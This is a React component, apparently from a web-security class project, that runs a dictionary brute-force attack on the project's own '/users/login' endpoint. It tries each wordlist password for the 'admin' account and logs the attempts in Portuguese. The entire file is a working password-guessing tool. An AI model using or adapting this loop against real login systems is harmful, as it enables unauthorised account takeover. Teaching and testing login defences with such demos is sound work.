import React from "react";
import wordlist from "../data/wordlist";
import myfetch from "../lib/myfetch";

let stop = false;

export default function BruteForce() {
    const [log, setlog] = React.useState([]);

    async function tryPassword(password) {
        try {
            await myfetch.post('/users/login', {
                username: "admin",
                password
            });
            return 'OK';
        } catch (error) {
            return error.message;
        }
    }

    async function handleStartClick(event) {
        event.target.disabled = true;
        stop = false;
        for (let i = 0; i < wordlist.length; i++) {
            if (stop) break;
            let result = await tryPassword(wordlist[i]);
            if (result === 'OK') {
                setlog(prev => [...prev, `Senha encontrada, tentativa nº ${i + 1}: ${wordlist[i]}`]);
                stop = true;
                break;
            } else {
                setlog(prev => [...prev, `Tentativa nº ${i + 1}: ${wordlist[i]} - ${result}`]);
            }
            await new Promise(resolve => setTimeout(resolve, 250));
        }
        event.target.disabled = false;
    }

    return <>
        <h1>Ataque de força bruta no <em>Login</em></h1>
        <div style={{
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            alignItems: 'center',
            marginTop: '20px'
        }}>
            <button onClick={handleStartClick}>Iniciar</button>
            <button onClick={() => stop = true} disabled={!stop}>
                Parar
            </button>
            <div style={{ fontFamily: 'monospace', marginTop: '20px' }}>
                {log.map((line, index) => <div key={index}>{line}</div>)}
            </div>
        </div>
    </>
}
